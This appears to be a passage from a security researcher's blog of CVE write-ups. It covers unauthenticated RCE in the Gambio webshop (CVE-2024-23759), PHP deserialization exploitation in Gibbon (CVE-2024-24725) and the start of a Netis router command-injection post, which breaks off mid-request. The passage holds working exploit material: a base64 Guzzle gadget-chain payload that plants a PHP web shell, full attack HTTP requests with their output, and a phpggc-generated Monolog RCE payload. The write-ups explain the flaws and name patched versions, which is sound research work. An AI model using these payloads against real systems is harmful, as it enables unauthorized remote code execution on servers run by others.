TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTo5OntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjMwOiI8P3BocCBlY2hvIHN5c3RlbSgnd2hvYW1pJyk7Pz4iO3M6NDoiUGF0aCI7czoxOiIvIjtzOjQ6Ik5hbWUiO3M6NjoiY3Vja29vIjtzOjY6IkRvbWFpbiI7czo5OiJjbG9jay5jb20iO3M6NjoiU2VjdXJlIjtiOjA7czo4OiJIdHRwb25seSI7YjowO3M6NzoiTWF4LUFnZSI7aTozO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7TjtzOjQxOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBmaWxlbmFtZSI7czoxMDoiY3Vja29vLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO30K
```

and using the following HTTP POST request:
```html
POST /shop.php?do=Parcelshopfinder/AddAddressBookEntry HTTP/1.1
Host: your_webshop_ip
Content-Type: application/x-www-form-urlencoded
Cookie: your_cookie

checkout_started=0&search=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTo5OntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjMwOiI8P3BocCBlY2hvIHN5c3RlbSgnd2hvYW1pJyk7Pz4iO3M6NDoiUGF0aCI7czoxOiIvIjtzOjQ6Ik5hbWUiO3M6NjoiY3Vja29vIjtzOjY6IkRvbWFpbiI7czo5OiJjbG9jay5jb20iO3M6NjoiU2VjdXJlIjtiOjA7czo4OiJIdHRwb25seSI7YjowO3M6NzoiTWF4LUFnZSI7aTozO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7TjtzOjQxOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBmaWxlbmFtZSI7czoxMDoiY3Vja29vLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO30K&street_address=timestreet&house_number=10&additional_info=&postcode=000&city=bigben&country=DE&firstname=cuckoo&lastname=clock&postnumber=111111&psf_name=t
```
You should get a HTTP 500 error and the response should show `<h1>Unexpected error occurred...</h1>Cannot use object of type GuzzleHttp\Cookie\FileCookieJar as array`.

However, it is important to obtain a valid session cookie first in order to execute the above POST request successfully.
You can obtain this session cookie by first creating a guest user in the online web application using the HTTP POST request below.
This does not require any pre-authentication to be successful.
```html
POST /shop.php?do=CreateGuest/Proceed HTTP/1.1
Host: your_webshop_ip
Content-Type: application/x-www-form-urlencoded

firstname=cuckoo&lastname=clock&email_address=cuckoo@clock.com&email_address_confirm=cuckoo@clock.com&b2b_status=0&company=&vat=&street_address=timestreet&postcode=11111&city=bigben&country=8&telephone=4912312312312&fax=&action=process
```
**IMPORTANT NOTE:** Use value 8 for country otherwise this request is not successful. You should get a `302` and in the admin page of your online webshop the user should show up at the guest section.

If all goes well, a file `cuckoo.php` gets created in the `webroot ` directory with the PHP code `<?php echo system('whoami');?>`.
```shell
root@cuckoo:~# cd /var/www
root@cuckoo:/var/www# ls -l cuckoo.php
-rw-r--r-- 1 www-data www-data 165 Mar 29 08:51 cuckoo.php
root@cuckoo:/var/www# cat cuckoo.php
[{"Expires":1,"Discard":false,"Value":"<?php echo system('whoami');?>","Path":"\/","Name":"cuckoo","Domain":"clock.com","Secure":false,"Httponly":false,"Max-Age":3}]
```
When called for instance with `curl http://your_webshop_ip/cuckoo.php`, it should give you back the user under which the web service is running.
```shell
curl http://192.168.201.25/cuckoo.php
[{"Expires":1,"Discard":false,"Value":"www-data
www-data","Path":"\/","Name":"cuckoo","Domain":"clock.com","Secure":false,"Httponly":false,"Max-Age":3}]
```
I have created a Metasploit module that will exploit this vulnerability [Metasploit PR 19005: Gambio Webshop unauthenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19005).

## Mitigation
If you want to test the module, you can download a vulnerable Gambio online webshop software from [here](https://www.dmsolutions.de/gambio-download.html). The version 4 branch of Gambio online webshop is vulnerable starting from version `4.9.2.0` or lower. The version 3 branch is not vulnerable. You are strongly advised to upgrade your webshop to the latest version, but at least to a version greater then `4.9.2.0`. 

## References
[CVE-2024-23759](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23759)
[Herolab usd Advisory usd-2023-0046](https://herolab.usd.de/security-advisories/usd-2023-0046/)
[MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
[OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
[Gambio Webshop Downloads](https://www.dmsolutions.de/gambio-download.html)
[Metasploit PR 19005: Gambio Webshop unauthenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19005)

### Credits
Credits goes to the security researchers below who discovered this vulnerability.
* `Christian Poeschl and Lukas Schraven from Herolab usd.`


---

## CVE-2024-24725
*Posted 2024-03-30 · last revised 2024-05-27*

> Gibbon through 26.0.00 allows remote authenticated users to conduct PHP deserialization attacks via columnOrder in a POST request to the modules/System%20Admin/import_run.php&type=externalAssessment&step=4 URI.

Th Gibbon web application `v26.0.00` has a PHP deserialization vulnerability and I would like to use this particular example as a use case to explain a bit more how to find this type of vulnerabilities and how you can build your own exploit.

In some other articles, I already explained the concept of serialization and why it used in web application design, but let me quickly summarize the theory once more.

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to write complex data to inter-process memory, a file, or a database or send complex data, for example, over a network, between different components of an application, or in an API call.
The concept of serialization is very often used in application design to exchange data. Data objects get serialized, send and on the receiving end, de-serialized for further processing. Many programming languages offer native support for serialization where some languages serialize objects into binary formats, whereas others use different string formats.

So far, so good, but what is exactly `insecure deserialization` and why is it so dangerous?

**Insecure deserialization** is when user-controllable data is deserialized by a web application. This enables an attacker to manipulate serialized objects in order to pass harmful data into the application code. It is even possible to replace a serialized object with an object of an entirely different class. Even worse, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an "object injection" vulnerability. 
By doing this, an object of an unexpected class might cause an exception, however, the damage may already be done because many deserialization-based attacks are completed before deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the web application's own functionality does not directly interact with the malicious object.

Just a quick example of serialized  data, so we understand the structure. We will use PHP serialization string format.
Take this object Clock.
```php
$clock->type = "cuckoo";
$clock->isSold = true;
```
When serialized, this object may look something like below: 
```php
O:5:"Clock":2:{s:4:"type":s:6:"cuckoo"; s:6:"isSold":b:1;}

O:5:"Clock": - An object with the 4-character class name "Clock"
2: - the object has 2 attributes
s:4:"type" - The key of the first attribute is the 4-character string "type"
s:6:"cuckoo" - The value of the first attribute is the 6-character string "cuckoo"
s:6:"isSold" - The key of the second attribute is the 6-character string "isSold"
b:1 - The value of the second attribute is the boolean value true
```
The native methods for PHP serialization are `serialize()` and `unserialize()`. So If you have source code access, you should start by looking for `unserialize()` anywhere in the code to see if there is an opportunity to find and exploit an insecure deserialization vulnerability.

Let's now have a closer look at the Gibbon web application and try to correlate the above theory with the discovered deserialization vulnerability at the web application.

If you read the description in the CVE published for Gibbon, it mentions  a PHP deserialization vulnerability via `columnOrder` in a POST request to the `modules/System%20Admin/import_run.php&type=externalAssessment&step=4 `.

So let's have a look at the file `import_run.php` and check if we can find the `unserialize()` function that is typically used by PHP. The good thing is that Gibbon is open source so all the source code is available for analysis.

And indeed, there is `unserialize()` function in the file `import_run.php` and more important it has user-controllable parameters, such as `columnOrder` and `columnText` which makes this a potential candidate for insecure deserialization.
```php
    //STEP 3 & 4, DRY & LIVE RUN  -----------------------------------------------------------------------------------
    elseif ($step==3 || $step==4) {
        // Gather our data
        $mode = $_POST['mode'] ?? null;
        $syncField = $_POST['syncField'] ?? null;
        $syncColumn = $_POST['syncColumn'] ?? null;

        $csvData = $_POST['csvData'] ?? null;
        if ($step==4) {
            //  DESERIALIZATION with user-controllable data !!!
            $columnOrder = isset($_POST['columnOrder'])? unserialize($_POST['columnOrder']) : null;
            $columnText = isset($_POST['columnText'])? unserialize($_POST['columnText']) : null;
        } else {
            $columnOrder = $_POST['columnOrder'] ?? null;
            $columnText = $_POST['columnText'] ?? null;
        }

        $fieldDelimiter = isset($_POST['fieldDelimiter'])? urldecode($_POST['fieldDelimiter']) : null;
        $stringEnclosure = isset($_POST['stringEnclosure'])? urldecode($_POST['stringEnclosure']) : null;

        $ignoreErrors = $_POST['ignoreErrors'] ?? false;
```
But the big question is still how to put this potential deserialization vulnerability into a working exploit where you can pull off a remote code execution or establish a privileged  escalation.

A bit of theory again before we move on...
You have different ways to leverage a deserialization vulnerability by tampering the data, such as the object attributes or modifying data types where you can change the behavior and outcome of application functionality. 
Another way, is to use the application functionality that is associated with the deserialized data. An example of this could be an use case where deseralized data is used to upload a personal image file as part of creating a new user. If the attacker can manipulate the filename object during deserialization process, he/she potentially could change the image file to point to  a malicious malware file which will then be uploaded in the application. 

However, the most common way to leverage a deserialization vulnerability is to make use of the so called `Magic Methods` and `Gadget Chains`.
Let's quickly explain both concepts.

**Magic methods** are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double-underscores.

Developers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event or scenario occurs. Exactly when and why a magic method is invoked differs from method to method. One of the most common examples in PHP is `__construct()`, which is invoked whenever an object of the class is instantiated, similar to Python's `__init__`.  Important in this context, some languages have magic methods that are invoked automatically during the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method. 
To construct a simple exploit, you typically would look for classes containing deserialization magic methods, and check whether any of them perform dangerous operations on controllable data.  You can then pass in a serialized object of this class to use its magic method for an exploit. 

**Gadget Chains** 
Classes containing these deserialization magic methods can be used to initiate more complex attacks involving a long series of method invocations, known as a `gadget chain`.  It is important to understand that a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the web application. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that is invoked during deserialization, sometimes known as a `kick-off gadget`. 

Now this a lot of information, but how do we apply this in practice? 
Manually identifying gadget chains is a pretty complicated process that requires a deep understanding of the web application and you will need source code access in order to do this.

However, to make our life easier, there are pre-built gadget chains that you can try first. 
`Ambionics` has build a library of pre-built gadget chains designed for PHP based web applications, called [phpggc](https://github.com/ambionics/phpggc).  

If installed, you can check which pre-built gadget chains are available. 
It will tell you the name of the framework/library, the version of the framework/library for which gadgets are for, the type of exploitation such as RCE, File Write, File Read, Include..., and the vector (kickoff gadget) to trigger the chain after the unserialize (__destruct(), __toString(), offsetGet(), ...)
```shell
kali@cerberus:~/phpggc$ phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                                 TYPE                   VECTOR         I
Bitrix/RCE1                               17.x.x <= 22.0.300                                      RCE (Function call)    __destruct
CakePHP/RCE1                              ? <= 3.9.6                                              RCE (Command)          __destruct
CakePHP/RCE2                              ? <= 4.2.3                                              RCE (Function call)    __destruct
CodeIgniter4/RCE1                         4.0.2                                                   RCE (Function call)    __destruct
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.4+                                    RCE (Function call)    __destruct
CodeIgniter4/RCE3                         -4.1.3+                                                 RCE (Function call)    __destruct
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE (Function call)    __destruct
CodeIgniter4/RCE5                         -4.1.3+                                                 RCE (Function call)    __destruct
CodeIgniter4/RCE6                         -4.1.3 <= 4.2.10+                                       RCE (Function call)    __destruct
Doctrine/FW1                              ?                                                       File write             __toString     *
Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                          File write             __destruct     *
Doctrine/RCE1                             1.5.1 <= 2.7.2                                          RCE (PHP code)         __destruct     *
Doctrine/RCE2                             1.11.0 <= 2.3.2                                         RCE (Function call)    __destruct     *
Dompdf/FD1                                1.1.1 <= ?                                              File delete            __destruct     *
Dompdf/FD2                                ? < 1.1.1                                               File delete            __destruct     *
Drupal7/FD1                               7.0 < ?                                                 File delete            __destruct     *
Drupal7/RCE1                              7.0.8 < ?                                               RCE (Function call)    __destruct     *
Drupal9/RCE1                              -8.9.6 <= 9.4.9+                                        RCE (Function call)    __destruct     *
Guzzle/FW1                                4.0.0-rc.2 <= 7.5.0+                                    File write             __destruct
Guzzle/INFO1                              6.0.0 <= 6.3.2                                          phpinfo()              __destruct     *
Guzzle/RCE1                               6.0.0 <= 6.3.2                                          RCE (Function call)    __destruct     *
Horde/RCE1                                <= 5.2.22                                               RCE (PHP code)         __destruct     *
Kohana/FR1                                3.*                                                     File read              __toString     *
Laminas/FD1                               <= 2.11.2                                               File delete            __destruct
Laminas/FW1                               2.8.0 <= 3.0.x-dev                                      File write             __destruct     *
Laravel/RCE1                              5.4.27                                                  RCE (Function call)    __destruct
Laravel/RCE2                              5.4.0 <= 8.6.9+                                         RCE (Function call)    __destruct
Laravel/RCE3                              5.5.0 <= 5.8.35                                         RCE (Function call)    __destruct     *
Laravel/RCE4                              5.4.0 <= 8.6.9+                                         RCE (Function call)    __destruct
Laravel/RCE5                              5.8.30                                                  RCE (PHP code)         __destruct     *
Laravel/RCE6                              5.5.* <= 5.8.35                                         RCE (PHP code)         __destruct     *
Laravel/RCE7                              ? <= 8.16.1                                             RCE (Function call)    __destruct     *
Laravel/RCE8                              7.0.0 <= 8.6.9+                                         RCE (Function call)    __destruct     *
Laravel/RCE9                              5.4.0 <= 9.1.8+                                         RCE (Function call)    __destruct
Laravel/RCE10                             5.6.0 <= 9.1.8+                                         RCE (Function call)    __toString
Laravel/RCE11                             5.4.0 <= 9.1.8+                                         RCE (Function call)    __destruct
Laravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                   RCE (Function call)    __destruct     *
Laravel/RCE13                             5.3.0 <= 9.5.1+                                         RCE (Function call)    __destruct     *
Laravel/RCE14                             5.3.0 <= 9.5.1+                                         RCE (Function call)    __destruct
Laravel/RCE15                             5.5.0 <= v9.5.1+                                        RCE (Function call)    __destruct
Laravel/RCE16                             5.6.0 <= v9.5.1+                                        RCE (Function call)    __destruct
Magento/FW1                               ? <= 1.9.4.0                                            File write             __destruct     *
Magento/SQLI1                             ? <= 1.9.4.0                                            SQL injection          __destruct
Magento2/FD1                              *                                                       File delete            __destruct     *
Monolog/FW1                               3.0.0 <= 3.1.0+                                         File write             __destruct     *
Monolog/RCE1                              1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+                         RCE (Function call)    __destruct
Monolog/RCE2                              1.4.1 <= 2.7.0+                                         RCE (Function call)    __destruct
Monolog/RCE3                              1.1.0 <= 1.10.0                                         RCE (Function call)    __destruct
Monolog/RCE4                              ? <= 2.4.4+                                             RCE (Command)          __destruct     *
Monolog/RCE5                              1.25 <= 2.7.0+                                          RCE (Function call)    __destruct
Monolog/RCE6                              1.10.0 <= 2.7.0+                                        RCE (Function call)    __destruct
Monolog/RCE7                              1.10.0 <= 2.7.0+                                        RCE (Function call)    __destruct     *
Monolog/RCE8                              3.0.0 <= 3.1.0+                                         RCE (Function call)    __destruct     *
Monolog/RCE9                              3.0.0 <= 3.1.0+                                         RCE (Function call)    __destruct     *
Phalcon/RCE1                              <= 1.2.2                                                RCE                    __wakeup       *
Phing/FD1                                 2.6.0 <= 3.0.0a3                                        File delete            __destruct
PHPCSFixer/FD1                            <= 2.17.3                                               File delete            __destruct
PHPCSFixer/FD2                            <= 2.17.3                                               File delete            __destruct
PHPExcel/FD1                              1.8.2+                                                  File delete            __destruct
PHPExcel/FD2                              <= 1.8.1                                                File delete            __destruct
PHPExcel/FD3                              1.8.2+                                                  File delete            __destruct
PHPExcel/FD4                              <= 1.8.1                                                File delete            __destruct
PHPSecLib/RCE1                            2.0.0 <= 2.0.34                                         RCE (PHP code)         __destruct     *
Pydio/Guzzle/RCE1                         < 8.2.2                                                 RCE (Function call)    __toString
Slim/RCE1                                 3.8.1                                                   RCE (Function call)    __toString
Smarty/FD1                                ?                                                       File delete            __destruct
Smarty/SSRF1                              ?                                                       SSRF                   __destruct     *
Spiral/RCE1                               2.7.0 <= 2.8.13                                         RCE (Function call)    __destruct
Spiral/RCE2                               -2.8+                                                   RCE (Function call)    __destruct     *
SwiftMailer/FD1                           -5.4.12+, -6.2.1+                                       File delete            __destruct
SwiftMailer/FD2                           5.4.6 <= 5.x-dev                                        File delete            __destruct     *
SwiftMailer/FR1                           6.0.0 <= 6.3.0                                          File read              __toString
SwiftMailer/FW1                           5.1.0 <= 5.4.8                                          File write             __toString
SwiftMailer/FW2                           6.0.0 <= 6.0.1                                          File write             __toString
SwiftMailer/FW3                           5.0.1                                                   File write             __toString
SwiftMailer/FW4                           4.0.0 <= ?                                              File write             __destruct
Symfony/FD1                               v3.2.7 <= v3.4.25 v4.0.0 <= v4.1.11 v4.2.0 <= v4.2.6    File delete            __destruct
Symfony/FW1                               2.5.2                                                   File write             DebugImport    *
Symfony/FW2                               3.4                                                     File write             __destruct
Symfony/RCE1                              v3.1.0 <= v3.4.34                                       RCE (Command)          __destruct     *
Symfony/RCE2                              2.3.42 < 2.6                                            RCE (PHP code)         __destruct     *
Symfony/RCE3                              2.6 <= 2.8.32                                           RCE (PHP code)         __destruct     *
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE (Function call)    __destruct     *
Symfony/RCE5                              5.2.*                                                   RCE (Function call)    __destruct
Symfony/RCE6                              v3.4.0-BETA4 <= v3.4.49 & v4.0.0-BETA4 <= v4.1.13       RCE (Command)          __destruct     *
Symfony/RCE7                              v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 <= v4.3.7    RCE (Function call)    __destruct
Symfony/RCE8                              v3.4.0 <= v4.4.18 v5.0.0 <= v5.2.1                      RCE (Function call)    __destruct
TCPDF/FD1                                 <= 6.3.5                                                File delete            __destruct     *
ThinkPHP/FW1                              5.0.4-5.0.24                                            File write             __destruct     *
ThinkPHP/FW2                              5.0.0-5.0.03                                            File write             __destruct     *
ThinkPHP/RCE1                             5.1.x-5.2.x                                             RCE (Function call)    __destruct     *
ThinkPHP/RCE2                             5.0.24                                                  RCE (Function call)    __destruct     *
ThinkPHP/RCE3                             -6.0.1+                                                 RCE (Function call)    __destruct
ThinkPHP/RCE4                             -6.0.1+                                                 RCE (Function call)    __destruct
Typo3/FD1                                 4.5.35 <= 10.4.1                                        File delete            __destruct     *
vBulletin/RCE1                            -5.6.9+                                                 RCE (Function call)    __destruct
WordPress/Dompdf/RCE1                     0.8.5+ & WP < 5.5.2                                     RCE (Function call)    __destruct     *
WordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4 & WP < 5.5.2                             RCE (Function call)    __destruct     *
WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2                            RCE (Function call)    __toString     *
WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2                            RCE (Function call)    __destruct     *
WordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+ & WP < 5.5.2                              RCE (Function call)    __destruct     *
WordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+ & WP < 5.5.2                              RCE (Function call)    __destruct     *
WordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+ & WP < 5.5.2                            RCE (Function call)    __destruct     *
WordPress/P/WooCommerce/RCE2              <= 3.4.0 & WP < 5.5.2                                   RCE (Function call)    __destruct     *
WordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6 & WP < 5.5.2                                 RCE (Function call)    __destruct     *
WordPress/PHPExcel/RCE1                   1.8.2+ & WP < 5.5.2                                     RCE (Function call)    __toString     *
WordPress/PHPExcel/RCE2                   <= 1.8.1 & WP < 5.5.2                                   RCE (Function call)    __toString     *
WordPress/PHPExcel/RCE3                   1.8.2+ & WP < 5.5.2                                     RCE (Function call)    __destruct     *
WordPress/PHPExcel/RCE4                   <= 1.8.1 & WP < 5.5.2                                   RCE (Function call)    __destruct     *
WordPress/PHPExcel/RCE5                   1.8.2+ & WP < 5.5.2                                     RCE (Function call)    __destruct     *
WordPress/PHPExcel/RCE6                   <= 1.8.1 & WP < 5.5.2                                   RCE (Function call)    __destruct     *
Yii/RCE1                                  1.1.20                                                  RCE (Function call)    __wakeup       *
Yii/RCE2                                  1.1.20                                                  RCE (Function call)    __destruct
Yii2/RCE1                                 <2.0.38                                                 RCE (Function call)    __destruct     *
Yii2/RCE2                                 <2.0.38                                                 RCE (PHP code)         __destruct     *
ZendFramework/FD1                         ? <= 1.12.20                                            File delete            __destruct
ZendFramework/RCE1                        ? <= 1.12.20                                            RCE (PHP code)         __destruct     *
ZendFramework/RCE2                        1.11.12 <= 1.12.20                                      RCE (Function call)    __toString     *
ZendFramework/RCE3                        2.0.1 <= ?                                              RCE (Function call)    __destruct
ZendFramework/RCE4                        ? <= 1.12.20                                            RCE (PHP code)         __destruct     *
ZendFramework/RCE5                        2.0.0rc2 <= 2.5.3                                       RCE (Function call)    __destruct
```
Yeah, this definitely helps, but we need to figure out first which gadget chains are supported by our Gibbon web application.
If we look at the directory where Gibbon is installed, typically `/var/www` or `/var/www/html` depending on the `webroot` setting, you will find a directory `vendor`. Running the `ls` command will list the framework/libraries that are installed and supported by the web application.
```
root@cuckoo:/var/www/vendor# ls
aura          ezyang      league        moneyphp  omnipay    phpoffice  setasign
autoload.php  firebase    maennchen     monolog   paragonie  phpseclib  slim
clue          fzaninotto  markbaker     mpdf      parsecsv   psr        symfony
composer      google      matthewbdaly  myclabs   php-http   ralouphie  tecnickcom
eluceo        guzzlehttp  microsoft     nikic     phpmailer  robthree   twig
```
And indeed you can see that there are frameworks/libraries listed that are part of our gadget chain list, such as `monolog` and `symfony`.

Ok, so we have some pre-built gadget chains options that we can try, but we also need to figure if the versions installed are supported.
Let's explore `monolog` a bit deeper and check `CHANGELOG.md` which version is installed.
```shell
root@cuckoo:/var/www/vendor/monolog/monolog# cat CHANGELOG.md
### 1.27.1 (2022-06-09)

  * Fixed MandrillHandler support for SwiftMailer 6 (#1676)
  * Fixed StreamHandler chunk size (backport from #1552)

### 1.27.0 (2022-03-13)

  * Added $maxDepth / setMaxDepth to NormalizerFormatter / JsonFormatter to configure the maximum depth if the default of 9 does not work for you (#1633)
```
Version `1.27.1` is installed, so the next question is which pre-built monolog gadget chains can we use?
There is a nice python script  `test-gc-compatibility.py` as part of  `phpggc` that does this job for us.
```shell
kali@cerberus:~/phpggc$ python ./test-gc-compatibility.py monolog/monolog:1.27.1 monolog/fw1 monolog/rce1 monolog/rce2 monolog/rce3 monolog/rce4 monolog/rce5 monolog/rce6 monolog/rce7 monolog/rce8 monolog/rce9 -w 4
Running on PHP version PHP 8.2.12 (cli) (built: Jan  8 2024 02:15:58) (NTS).
Testing 1 versions for monolog/monolog against 10 gadget chains.

┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓
┃ monolog/monolog ┃ Package ┃ monolog/fw1 ┃ monolog/rce1 ┃ monolog/rce2 ┃ monolog/rce3 ┃ monolog/rce4 ┃ monolog/rce5 ┃ monolog/rce6 ┃ monolog/rce7 ┃ monolog/rce8 ┃ monolog/rce9 ┃
┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩
│ 1.27.1          │   OK    │     KO      │      OK      │      OK      │      KO      │      KO      │      OK      │      OK      │      OK      │      KO      │      KO      │
└─────────────────┴─────────┴─────────────┴──────────────┴──────────────┴──────────────┴──────────────┴──────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
kali@cerberus:~/phpggc$
```
So we have quite some options that we can test.

To generate the serialized data with the payload for a particular gadget chain, you can run the following command: `./phpggc -f monolog/rce1 system id` which generates the gadget chain `monolog/rce1` with the payload. In this case, the serialized data gets deserialized and the `id` command gets executed using the system function call.
It is important, that it does not really matter if the instantiation of this object makes logical sense from an application perspective. We are manipulating the serialized data generated by the web application and pushing it to a supported gadget chain that will generate an object instance and hopefully execute the payload during the deserialization process. The `-f` option applies the fast-destruct technique, so that the object is destroyed right after the `unserialize()` call, as opposed to at the end of the script.
```shell
kali@cerberus:~/phpggc$ ./phpggc -f monolog/rce1 system id
a:2:{i:7;O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:3;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}i:7;i:7;}
```
Important: there are null bytes in the serialized data, for example `*socket` is `\x00*\x00socket` and therefore the size is 9 and not 7. 
This applies for all the `*items`.

I have created an exploit that is are published as official module [Gibbon Online School Platform Authenticated RCE [CVE-2024-24725]](https://github.com/rapid7/metasploit-framework/pull/19044) in Metasploit. 
If you review the module, you will see most of the above theory and discussions back in the exploit code.

### Summary
Deserialization flaws are pretty common in web application design. 
Here are some simple  steps to identify and exploit potential deserialization vulnerabilities in the application code:
1. get access to the application source code;
2. search for the language specific serialization and deserialization functions in the code. For PHP, these functions  are `serialize()` and `unserialize()`;
3. check if user-controlled parameters are part of serialize and deserialize process;
4. check the availability of pre-built gadget chains that are supported by your web application and can be leveraged; and
5. last but not least, try and error until the magic happens ;-)

Till next time....

## References
[CVE-2024-24725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24725)
[MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
[OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
[Metasploit PR 19044: Gibbon Online School Platform Authenticated RCE [CVE-2024-24725]] (https://github.com/rapid7/metasploit-framework/pull/19044)

### Credits
Credits go to the security researchers below whom discovered this vulnerability
* `SecondX.io Research Team (Ali Maharramli, Fikrat Guliev, Islam Rzayev )`

---

## CVE-2024-22729
*Posted 2024-05-19 · last revised 2024-07-31*

> NETIS SYSTEMS MW5360 V1.0.1.3031 was discovered to contain a command injection vulnerability via the password parameter on the login page.

Netis Systems Co., Ltd is a global leading provider of networking products and solutions in the data communication industry. It has three worldwide independent brands “netis”, “netcore” and “stonet” .Product lines of Netis company includes Wireless routers, Access point wireless adapters, Dump switches, POE switches, Industrial switches, etc.

A critical security vulnerability has been identified in the Netis router MW5360 by security researcher `adhikara13`. This vulnerability results in a Blind Command Injection in the "password" parameter, leading to unauthorized access. 
`Adhikara13` shared details in a POC on Github how to exploit this vulnerability which can be found [here](https://github.com/adhikara13/CVE/blob/main/netis_MW5360/blind%20command%20injection%20in%20password%20parameter%20in%20initial%20settings.md).

A more detailed analysis on vulnerability is not available so I did some reverse engineering on the firmware to understand the details of this vulnerability. So I download the latest firmware `MW5360-1.0.1.3442` from [here](https://www.netisru.com/Suppory/de_details/id/1/de/136.html) which is a very recent release from April 2024 that is still vulnerable :-(.
I emulated the firmware using `FirmAE` and used `burpsuite` to catch the requests to understand what was going on.

On the initial startup of the router, it will show you a welcome message and a setup screen to configure the router administration password and wifi settings including the wifi password which is the same as the administration password.
Capturing this request with `burpsuite` already shows the first design flaw, because this POST request can be executed multiple times without any authentication where the wifi password and administration password can be changed by manipulating the `password` and `wpaPsk` field.

**POST Request**
```html
POST /cgi-bin/skk_set.cgi HTTP/1.1
Host: 192.168.1.1
Content-Length: 201
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.1
Referer: http://192.168.1.1/guide/welcome.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

